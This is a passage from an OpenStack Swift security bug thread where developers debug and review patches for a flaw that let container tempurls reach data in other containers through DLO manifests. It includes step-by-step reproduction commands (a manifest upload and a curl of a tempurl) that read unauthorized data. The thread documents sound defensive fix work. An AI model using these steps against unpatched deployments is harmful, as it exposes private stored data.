There is a big in the functional test for this scenario (I think, its late and this is complicated for my small brain!), I will attach a patch which leaves the test test.functional.tests.TestContainerTempurl#test\_GET\_DLO\_outside\_container failing due to above I think.
Patch is against master and based on Christian's rebase onto master in #60 with a change to the func test to reveal a failure case.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#68](/swift/%2Bbug/1449212/comments/68) |
| --- | --- | --- | --- |

First, in comment #67, s/big/bug/ !

Couple of other comments:

1. TestContainerTempurl shouldl remove any account level tempurl keys that have been left in place by other tests, to avoid any coupling of the tempurl scopes being tested.

2. I have a nagging concern about auth\_callback\_same\_container returning None when the path fails to split as expected, havent pinned down a case when that would be bad yet though.

def authorize\_same\_container(account\_to\_match, container\_to\_match):

def auth\_callback\_same\_container(req):

        try:

            \_ver, acc, con, \_rest = req.split\_path(3, 4, True)

        except ValueError:

            return None

^^^^^^^^^^^^^^^^^^ is it relly safe to auth a request when split.path fails??

if acc == account\_to\_match and con == container\_to\_match:

            return None

        else:

            return HTTPUnauthorized(request=req)

return auth\_callback\_same\_container

First, in comment #67, s/big/bug/ !
Couple of other comments:
1. TestContainerTempurl shouldl remove any account level tempurl keys that have been left in place by other tests, to avoid any coupling of the tempurl scopes being tested.
2. I have a nagging concern about auth\_callback\_same\_container returning None when the path fails to split as expected, havent pinned down a case when that would be bad yet though.
def authorize\_same\_container(account\_to\_match, container\_to\_match):
def auth\_callback\_same\_container(req):
try:
\_ver, acc, con, \_rest = req.split\_path(3, 4, True)
except ValueError:
return None
^^^^^^^^^^^^^^^^^^ is it relly safe to auth a request when split.path fails??
if acc == account\_to\_match and con == container\_to\_match:
return None
else:
return HTTPUnauthorized(request=req)
return auth\_callback\_same\_container

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-05: |  |  | [#69](/swift/%2Bbug/1449212/comments/69) |
| --- | --- | --- | --- |

* [clays-56-with-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439955/%2Bfiles/clays-56-with-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439955)
  (27.1 KiB,
  text/plain)

I think the patch in comment #56 is broken. Here's how I tested this stuff:

Test Step 1: saio$ resetswift; startmain

Test Step 2: client$ swift upload victim setup.py setup.cfg AUTHORS # from Swift source tree; any old crap will do

Test Step 3: client$ swift post hacked -m "temp-url-key:conkey"

Test Step 4: curl "<http://192.168.22.144:8080>`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest conkey`" # should 4xx

Test Step 5: client$ swift post -m "temp-url-key:acckey"

Test Step 6: curl "<http://192.168.22.144:8080>`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest acckey`" # should 200

Base commit: 5b24b22

With no patch, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py.

With the patch from comment #56 applied, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py. I was expecting a 400-series error.

Upon inspection, the patch from comment #56 was missing the code to copy the environment before removing swift.authorize (swift.proxy.server.Application.handle\_request). If I add those two lines back in, then Test Step 4 gets a 401, as expected.

The attached patch here is Clay's patch from comment #56, plus the aforementioned two lines of code. I still get unit test failures with this, though.

I think the patch in comment #56 is broken. Here's how I tested this stuff:
Test Step 1: saio$ resetswift; startmain
Test Step 2: client$ swift upload victim setup.py setup.cfg AUTHORS # from Swift source tree; any old crap will do
Test Step 3: client$ swift post hacked -m "temp-url-key:conkey"
Test Step 4: curl "http://192.168.22.144:8080`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest conkey`" # should 4xx
Test Step 5: client$ swift post -m "temp-url-key:acckey"
Test Step 6: curl "http://192.168.22.144:8080`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest acckey`" # should 200
Base commit: 5b24b22
With no patch, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py.
With the patch from comment #56 applied, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py. I was expecting a 400-series error.
Upon inspection, the patch from comment #56 was missing the code to copy the environment before removing swift.authorize (swift.proxy.server.Application.handle\_request). If I add those two lines back in, then Test Step 4 gets a 401, as expected.
The attached patch here is Clay's patch from comment #56, plus the aforementioned two lines of code. I still get unit test failures with this, though.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-05: |  |  | [#70](/swift/%2Bbug/1449212/comments/70) |
| --- | --- | --- | --- |

Hrm... maybe having two bugs open wasn't such a great idea. Also maybe this is why smaller changes are better?

So what we \*need\* is to be able to take some Kilo+ sha, and Al's latest patch from lp [bug #1453948](/bugs/1453948) + some patch here that closes all of our issues (#1 PUT tempurl can not create a DLO; #2 cross container DLO 401's with container tempurl).

I found

+ req = Request(req.environ.copy())

in patch number #56 - but it seems like everyone else is building on the hack in #57 that doesn't do sam's info\_cache thing (i.e. #60, #67 and #69) and instead just calls that \_set\_info method again - but was mysteriously missing the environ.copy() line in my original version (i blame a git fail on my part)?

So, if everyone is cool with that general idea of patch #57 - i'll try to wade through the follow on patches and post here with what we need.

Hrm... maybe having two bugs open wasn't such a great idea. Also maybe this is why smaller changes are better?
So what we \*need\* is to be able to take some Kilo+ sha, and Al's latest patch from lp bug #1453948 + some patch here that closes all of our issues (#1 PUT tempurl can not create a DLO; #2 cross container DLO 401's with container tempurl).
I found
+ req = Request(req.environ.copy())
in patch number #56 - but it seems like everyone else is building on the hack in #57 that doesn't do sam's info\_cache thing (i.e. #60, #67 and #69) and instead just calls that \_set\_info method again - but was mysteriously missing the environ.copy() line in my original version (i blame a git fail on my part)?
So, if everyone is cool with that general idea of patch #57 - i'll try to wade through the follow on patches and post here with what we need.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-06: |  |  | [#71](/swift/%2Bbug/1449212/comments/71) |
| --- | --- | --- | --- |

I like the infocache thing. Really, the part I like about it is the part where the proxy doesn't mutate the passed-in environment, but takes a copy and mangles \*that\* instead.

Any time we have a middleware that makes more than one request (DLO, SLO, bulk, versions, symlinks...), we end up with these crappy bugs where the middleware makes a request using some environment, the proxy or a later middleware scribbles all over it, and then our middleware reuses that environment and things blow up. That's what happened here, right?

A) tempurl put swift.authorize in the environment and called the rest of the chain

B) the proxy called swift.authorize and then mutated the environment to remove it, which is okay because nobody else is ever going to re-use this environment for anything ever again /s

C) dlo saw the response was for a manifest and so it made a new environment based on the current environment to go fetch segments

D) the proxy got another request without swift.authorize in it (since the proxy wiped it out in step B) and let the request proceed

E) lots of people spent time typing up 70+ comments on this Launchpad bug

We can either work around this bit of request mutation to fix this specific bug and leave a land mine for ourselves to step on next time, or we can get rid of it now. I'd rather get rid of it now.

Moving all that cache into swift.infocache also makes it easier to eliminate future request-environment mutations as we find them. It lets you make a shallow copy of the environment to mutate, thus saving your caller from you, while still ensuring we don't get the same info from memcache or account/container servers twice. It's taking all that hazardous mutable stuff and sticking it in its own little box, separate from the rest of our unchanging request state.

I like the infocache thing. Really, the part I like about it is the part where the proxy doesn't mutate the passed-in environment, but takes a copy and mangles \*that\* instead.
Any time we have a middleware that makes more than one request (DLO, SLO, bulk, versions, symlinks...), we end up with these crappy bugs where the middleware makes a request using some environment, the proxy or a later middleware scribbles all over it, and then our middleware reuses that environment and things blow up. That's what happened here, right?
A) tempurl put swift.authorize in the environment and called the rest of the chain
B) the proxy called swift.authorize and then mutated the environment to remove it, which is okay because nobody else is ever going to re-use this environment for anything ever again /s
C) dlo saw the response was for a manifest and so it made a new environment based on the current environment to go fetch segments
D) the proxy got another request without swift.authorize in it (since the proxy wiped it out in step B) and let the request proceed
E) lots of people spent time typing up 70+ comments on this Launchpad bug
We can either work around this bit of request mutation to fix this specific bug and leave a land mine for ourselves to step on next time, or we can get rid of it now. I'd rather get rid of it now.
Moving all that cache into swift.infocache also makes it easier to eliminate future request-environment mutations as we find them. It lets you make a shallow copy of the environment to mutate, thus saving your caller from you, while still ensuring we don't get the same info from memcache or account/container servers twice. It's taking all that hazardous mutable stuff and sticking it in its own little box, separate from the rest of our unchanging request state.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-06: |  |  | [#72](/swift/%2Bbug/1449212/comments/72) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch3.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439989/%2Bfiles/tempurl-torgomatic-patch3.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439989)
  (87.9 KiB,
  text/plain)

This is a rebase of the patch from comment #42. I believe it still solves the problem of DLO GET or HEAD requests being able to escape their container, and I believe it still does not address the creation of DLO manifests via tempurl PUT (that's a separate LP bug, though if people want to merge them, fine by me).

This is a rebase of the patch from comment #42. I believe it still solves the problem of DLO GET or HEAD requests being able to escape their container, and I believe it still does not address the creation of DLO manifests via tempurl PUT (that's a separate LP bug, though if people want to merge them, fine by me).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-06: |  |  | [#73](/swift/%2Bbug/1449212/comments/73) |
| --- | --- | --- | --- |

-1

So there was a number of improvements to the tests from patch #42 to #56 - which seems lost in #72. Plus #72 is \*not\* based on the already approved and back-ported patch in lp [bug #1453948](/bugs/1453948).

I discussed this with Sam and he seems sufficiently agitated that he's just going to fix everything.

-1
So there was a number of improvements to the tests from patch #42 to #56 - which seems lost in #72. Plus #72 is \*not\* based on the already approved and back-ported patch in lp bug #1453948.
I discussed this with Sam and he seems sufficiently agitated that he's just going to fix everything.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-06: |  |  | [#74](/swift/%2Bbug/1449212/comments/74) |
| --- | --- | --- | --- |

* [container-tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440490/%2Bfiles/container-tempurl.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440490)
  (30.7 KiB,
  text/plain)

I had a stab at an alternative approach to avoid making any changes to the info caching (not saying they aren't good changes to make, but this avoids making them in this security bug fix). I'm not against the info cache/env copying stuff, I was just trying to find a way to a smaller diff to fix the current bug!

In the attached patch I have tempurl instruct the proxy server to NOT delete 'swift.authorize'. Then have the same scoped callbacks as proposed on previous patches on this thread. That removes the need to copy the request env before popping swift.authorize, cos it never gets popped with tempurl.

The attached patch is based on Clay's patch at #15 on [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948), so apply that one first, then this one and you should have both bugs fixed.

(Another approach which works is to have the tempurl authorize callbacks return not-None on first call (from proxy) then behave normally for subsequent calls. That works because tempurl only targets objects and all object controller methods implement delay\_denial. But I ditched that approach as it depends on the delay\_denial properties not changing below tempurl.)

I had a stab at an alternative approach to avoid making any changes to the info caching (not saying they aren't good changes to make, but this avoids making them in this security bug fix). I'm not against the info cache/env copying stuff, I was just trying to find a way to a smaller diff to fix the current bug!
In the attached patch I have tempurl instruct the proxy server to NOT delete 'swift.authorize'. Then have the same scoped callbacks as proposed on previous patches on this thread. That removes the need to copy the request env before popping swift.authorize, cos it never gets popped with tempurl.
The attached patch is based on Clay's patch at #15 on https://bugs.launchpad.net/swift/+bug/1453948, so apply that one first, then this one and you should have both bugs fixed.
(Another approach which works is to have the tempurl authorize callbacks return not-None on first call (from proxy) then behave normally for subsequent calls. That works because tempurl only targets objects and all object controller methods implement delay\_denial. But I ditched that approach as it depends on the delay\_denial properties not changing below tempurl.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-07: |  |  | [#75](/swift/%2Bbug/1449212/comments/75) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch4.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440773/%2Bfiles/tempurl-torgomatic-patch4.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440773)
  (34.7 KiB,
  text/plain)

Here's Clay's patch from #57 but with the unit tests passing.

There were a few things I had to do to make that work: first, make\_pre\_authed\_env() had to start setting swift\_owner = True in the environment it created. Otherwise, the container controller would unhelpfully filter out the ACLs from a GET or HEAD response, and in the case where the environment's identity was not preserved, get\_container\_info() wouldn't have the ACLs in it.

Second, I had to hack around account GET and HEAD requests when (a) account autocreate is on, and (b) the account does not actually exist. In this case, the proxy caches a 404 result down in GETorHEAD\_base. However, it then returns a 200 or 204 with an empty listing. Thus, if environment identity is not preserved, get\_info() sees a 2xx response and caches it, which breaks a bunch of tests. I hacked around it with some made-up header; better suggestions welcome.

Third and ugliest, I commented out one unit test (last line of test.unit.proxy.server.TestContainerController.test\_HEAD\_GET). That test was asserting stuff about the environment caching behavior when the account doesn't exist and account autocreate is on. I wasn't sure how to keep that working \*and\* keep the other account-autocreate tests working too, and it really doesn't seem too important what we cache in this particular case. Again, suggestions welcome.

Here's Clay's patch from #57 but with the unit tests passing.
There were a few things I had to do to make that work: first, make\_pre\_authed\_env() had to start setting swift\_owner = True in the environment it created. Otherwise, the container controller would unhelpfully filter out the ACLs from a GET or HEAD response, and in the case where the environment's identity was not preserved, get\_container\_info() wouldn't have the ACLs in it.
Second, I had to hack around account GET and HEAD requests when (a) account autocreate is on, and (b) the account does not actually exist. In this case, the proxy caches a 404 result down in GETorHEAD\_base. However, it then returns a 200 or 204 with an empty listing. Thus, if environment identity is not preserved, get\_info() sees a 2xx response and caches it, which breaks a bunch of tests. I hacked around it with some made-up header; better suggestions welcome.
Third and ugliest, I commented out one unit test (last line of test.unit.proxy.server.TestContainerController.test\_HEAD\_GET). That test was asserting stuff about the environment caching behavior when the account doesn't exist and account autocreate is on. I wasn't sure how to keep that working \*and\* keep the other account-autocreate tests working too, and it really doesn't seem too important what we cache in this particular case. Again, suggestions welcome.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-07: |  |  | [#76](/swift/%2Bbug/1449212/comments/76) |
| --- | --- | --- | --- |

Both patches (Sams & Alistairs, #75 and #74) work for me and the outcome is as expected.

I currently tend to favor Sams patch slightly, but basically I'm fine with both - thus 2 times +2.

Both patches (Sams & Alistairs, #75 and #74) work for me and the outcome is as expected.
I currently tend to favor Sams patch slightly, but basically I'm fine with both - thus 2 times +2.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#77](/swift/%2Bbug/1449212/comments/77) |
| --- | --- | --- | --- |

Alright, here's another take on it. The problem is the proxy takes swift.authorize out of the environment. We had a patch to make the environment immutable, but that was a huge change. Then we had one where middlewares could tell the proxy to leave authorize alone, but that's pretty hacky. This one is even simpler: the proxy puts swift.authorize back. Stuff in the proxy that relies on swift.authorize being gone still see it as gone, but middlewares don't have their environment changed up when they make subrequests.

Alright, here's another take on it. The problem is the proxy takes swift.authorize out of the environment. We had a patch to make the environment immutable, but that was a huge change. Then we had one where middlewares could tell the proxy to leave authorize alone, but that's pretty hacky. This one is even simpler: the proxy puts swift.authorize back. Stuff in the proxy that relies on swift.authorize being gone still see it as gone, but middlewares don't have their environment changed up when they make subrequests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#78](/swift/%2Bbug/1449212/comments/78) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442299/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442299)
  (28.3 KiB,
  text/plain)

Let's try actually adding the patch, hey?

Let's try actually adding the patch, hey?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#79](/swift/%2Bbug/1449212/comments/79) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442300/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442300)
  (28.3 KiB,
  text/plain)

Let's try actually adding the patch, hey?

Let's try actually adding the patch, hey?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#80](/swift/%2Bbug/1449212/comments/80) |
| --- | --- | --- | --- |

And here we have the legendary DOUBLE DOUBLE POST POST! Thank you, Launchpad, for the opportunity to see this beast in the wild.

And here we have the legendary DOUBLE DOUBLE POST POST! Thank you, Launchpad, for the opportunity to see this beast in the wild.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#81](/swift/%2Bbug/1449212/comments/81) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch6.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442310/%2Bfiles/tempurl-torgomatic-patch6.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442310)
  (31.6 KiB,
  text/plain)

Here's a properly-formatted one. It's the same as the one in #79 but with a real commit comment.

I stuck everybody who posted any patch here in the Co-Authored-By lines. With this crapass non-threaded discussion forum, I can't keep track of what happened where. (Come on; \*email\* has threading and Launchpad doesn't? Talk about stone knives and bearskins.)

Here's a properly-formatted one. It's the same as the one in #79 but with a real commit comment.
I stuck everybody who posted any patch here in the Co-Authored-By lines. With this crapass non-threaded discussion forum, I can't keep track of what happened where. (Come on; \*email\* has threading and Launchpad doesn't? Talk about stone knives and bearskins.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#82](/swift/%2Bbug/1449212/comments/82) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch7.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442462/%2Bfiles/tempurl-torgomatic-patch7.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442462)
  (29.4 KiB,
  text/plain)

This is patch #81 with extraneous stuff removed and Alistair's fixes to the functional tests.

This is patch #81 with extraneous stuff removed and Alistair's fixes to the functional tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-11: |  |  | [#83](/swift/%2Bbug/1449212/comments/83) |
| --- | --- | --- | --- |

* [tempurl-acoles-patch8.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442888/%2Bfiles/tempurl-acoles-patch8.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442888)
  (29.2 KiB,
  text/plain)

Sam's patch at #82 LGTM

Sam, Clay and 1 did discuss two possible changes:

1. in proxy.server.py the "authorized" boolean is redundant, could just test the value of "old\_authorize".

2. in tempurl.py, have the new scoped authorize callback methods raise HTTPUnauthorized if the split\_path calls ever raise a ValueError (at the moment None is returned which means a request would be auth'd. I can't think of when a request would have no object part and it would matter, but paranoia suggests err'ing on the side of denial if split\_path fails).

I made those two changes in attached patch which applies to master using git am. On my SAIO this passes unit, pep8, functional and probe tests.

Sam's patch at #82 LGTM
Sam, Clay and 1 did discuss two possible changes:
1. in proxy.server.py the "authorized" boolean is redundant, could just test the value of "old\_authorize".
2. in tempurl.py, have the new scoped authorize callback methods raise HTTPUnauthorized if the split\_path calls ever raise a ValueError (at the moment None is returned which means a request would be auth'd. I can't think of when a request would have no object part and it would matter, but paranoia suggests err'ing on the side of denial if split\_path fails).
I made those two changes in attached patch which applies to master using git am. On my SAIO this passes unit, pep8, functional and probe tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-11: |  |  | [#84](/swift/%2Bbug/1449212/comments/84) |
| --- | --- | --- | --- |

@acoles patch doesn't apply cleanly with `git am` because it was formatted with `git show`

So I started with a fresh merge from master yesterday:

git checkout master

0279411 Merge "versioned writes middleware"

Then I popped off to another branch to add the commits

git checkout -b fix-container-tempurl

Then I applied the fix from lp [bug #1453948](/bugs/1453948) comment #15

git am < dlo-tempurl.patch

Then I applied the fix in comment #82 (seems to require 3-way)

git am -3 < container-tempurl.patch

Those changes taken together works well for me. I understand our new functional tests we should be validating the behaviors we're tracking. I also agree with @acoles suggested cleanups in comment #83 - but we'll need to reformat that patch.

@acoles patch doesn't apply cleanly with `git am` because it was formatted with `git show`
So I started with a fresh merge from master yesterday:
git checkout master
0279411 Merge "versioned writes middleware"
Then I popped off to another branch to add the commits
git checkout -b fix-container-tempurl
Then I applied the fix from lp bug #1453948 comment #15
git am < dlo-tempurl.patch
Then I applied the fix in comment #82 (seems to require 3-way)
git am -3 < container-tempurl.patch
Those changes taken together works well for me. I understand our new functional tests we should be validating the behaviors we're tracking. I also agree with @acoles suggested cleanups in comment #83 - but we'll need to reformat that patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-11: |  |  | [#85](/swift/%2Bbug/1449212/comments/85) |
| --- | --- | --- | --- |

* [tempurl-acoles-patch9.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442926/%2Bfiles/tempurl-acoles-patch9.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442926)
  (29.4 KiB,
  text/plain)

Apologies, patch at #83 does not work with git am. See the diff attached here generated using git format-patch.

Apologies, patch at #83 does not work with git am. See the diff attached here generated using git format-patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-12: |  |  | [#86](/swift/%2Bbug/1449212/comments/86) |
| --- | --- | --- | --- |

Clays #84 method to apply both patches WFM using patch at #85- thanks Clay for figuring that out:

anc@u128:~/0dev/swift (master)$ git log --pretty=oneline -n 1

810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"

anc@u128:~/0dev/swift (master)$ git checkout -b fix-container-tempurl

Switched to a new branch 'fix-container-tempurl'

anc@u128:~/0dev/swift (fix-container-tempurl)$ git am ../patches/tempurl.patch

Applying: Disallow unsafe tempurl operations to point to unauthorized data

anc@u128:~/0dev/swift (fix-container-tempurl)$ git am -3 ../patches/tempurl-acoles-patch9.diff

Applying: Better scoping for tempurls, especially container tempurls

Using index info to reconstruct a base tree...

M swift/common/middleware/tempurl.py

M test/functional/tests.py

M test/unit/common/middleware/test\_tempurl.py

Falling back to patching base and 3-way merge...

Auto-merging test/unit/common/middleware/test\_tempurl.py

Auto-merging test/functional/tests.py

Auto-merging swift/common/middleware/tempurl.py

anc@u128:~/0dev/swift (fix-container-tempurl)$ git log --pretty=oneline -n 3

6bdd31aab0098b3ecf756667110fc7439fca8f7f Better scoping for tempurls, especially container tempurls

06bc45e8e76b1384500d67d7953d19fcedcc1967 Disallow unsafe tempurl operations to point to unauthorized data

810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"

The result passes tox -e py27,pep8 and functional tests on my saio (with keystoneauth).

I'm +2 on patch at #85.

Clays #84 method to apply both patches WFM using patch at #85- thanks Clay for figuring that out:
anc@u128:~/0dev/swift (master)$ git log --pretty=oneline -n 1
810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"
anc@u128:~/0dev/swift (master)$ git checkout -b fix-container-tempurl
Switched to a new branch 'fix-container-tempurl'
anc@u128:~/0dev/swift (fix-container-tempurl)$ git am ../patches/tempurl.patch
Applying: Disallow unsafe tempurl operations to point to unauthorized data
anc@u128:~/0dev/swift (fix-container-tempurl)$ git am -3 ../patches/tempurl-acoles-patch9.diff
Applying: Better scoping for tempurls, especially container tempurls
Using index info to reconstruct a base tree...
M swift/common/middleware/tempurl.py
M test/functional/tests.py
M test/unit/common/middleware/test\_tempurl.py
Falling back to patching base and 3-way merge...
Auto-merging test/unit/common/middleware/test\_tempurl.py
Auto-merging test/functional/tests.py
Auto-merging swift/common/middleware/tempurl.py
anc@u128:~/0dev/swift (fix-container-tempurl)$ git log --pretty=oneline -n 3
6bdd31aab0098b3ecf756667110fc7439fca8f7f Better scoping for tempurls, especially container tempurls
06bc45e8e76b1384500d67d7953d19fcedcc1967 Disallow unsafe tempurl operations to point to unauthorized data
810af1b73f309bd055b52fb63795cc5372eee3c7 Merge "Fix shebang of commands"
The result passes tox -e py27,pep8 and functional tests on my saio (with keystoneauth).
I'm +2 on patch at #85.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-14: |  |  | [#87](/swift/%2Bbug/1449212/comments/87) |
| --- | --- | --- | --- |

I'm +2 on patch @ #85

However, I'll admit that the commit messages makes things seem a little more dire than they would be after the tempurl-can-not-create-dlo fix from lp [bug #1453948](/bugs/1453948) is released. But since neither for them are released I think the wording is correct for this patch.

... now, before you go thinking "maybe we don't need scoped tempurls if you can't make \*LO's with tempurls?" - you \*can\* make \*LO's with write-acl's - so it's a more complicated attack, but if we only did the other change, a write-acl and container-tempurl would be just as vulnerable to the DLO probing as described in the commit. Regardless of how the "object that points to other data" is created - scoping the ability of a container tempurl to grant read access only to the container that created them is critically important to meet our expected risk model.

After this is public we need to do doc change to highlight that container-tempurl's (unlike account-tempurls) don't work with cross-container manifests (again, regardless of how the cross-container manifests were created)

I'm +2 on patch @ #85
However, I'll admit that the commit messages makes things seem a little more dire than they would be after the tempurl-can-not-create-dlo fix from lp bug #1453948 is released. But since neither for them are released I think the wording is correct for this patch.
... now, before you go thinking "maybe we don't need scoped tempurls if you can't make \*LO's with tempurls?" - you \*can\* make \*LO's with write-acl's - so it's a more complicated attack, but if we only did the other change, a write-acl and container-tempurl would be just as vulnerable to the DLO probing as described in the commit. Regardless of how the "object that points to other data" is created - scoping the ability of a container tempurl to grant read access only to the container that created them is critically important to meet our expected risk model.
After this is public we need to do doc change to highlight that container-tempurl's (unlike account-tempurls) don't work with cross-container manifests (again, regardless of how the cross-container manifests were created)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-17: |  |  | [#88](/swift/%2Bbug/1449212/comments/88) |
| --- | --- | --- | --- |

Backports of patch #85 are needed for stable/kilo and stable/juno (using patches from [bug 1453948](/bugs/1453948), respectively from comment #17 and #16)

Backports of patch #85 are needed for stable/kilo and stable/juno (using patches from bug 1453948, respectively from comment #17 and #16)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-18: |  |  | [#89](/swift/%2Bbug/1449212/comments/89) |
| --- | --- | --- | --- |

This is not needed for stable/juno. The feature (container-level tempurls) was only released in kilo.

This is not needed for stable/juno. The feature (container-level tempurls) was only released in kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-18: |  |  | [#90](/swift/%2Bbug/1449212/comments/90) |
| --- | --- | --- | --- |

* [kilo-tempurl-bp-combined.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4446467/%2Bfiles/kilo-tempurl-bp-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4446467)
  (37.2 KiB,
  text/plain)

Attached is a backport of the patch in #85 to kilo. It includes the approved patch for [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) in the patch file (since it should be applied on top of that one).

Attached is a backport of the patch in #85 to kilo. It includes the approved patch for https://bugs.launchpad.net/swift/+bug/1453948 in the patch file (since it should be applied on top of that one).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-19: |  |  | [#91](/swift/%2Bbug/1449212/comments/91) |
| --- | --- | --- | --- |

+2 for backport at #90

applied to stale/kilo, passes func tests with keystone and tempauth, tox -e pep8,py27 and probe tests

+2 for backport at #90
applied to stale/kilo, passes func tests with keystone and tempauth, tox -e pep8,py27 and probe tests

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-19: |  |  | [#92](/swift/%2Bbug/1449212/comments/92) |
| --- | --- | --- | --- |

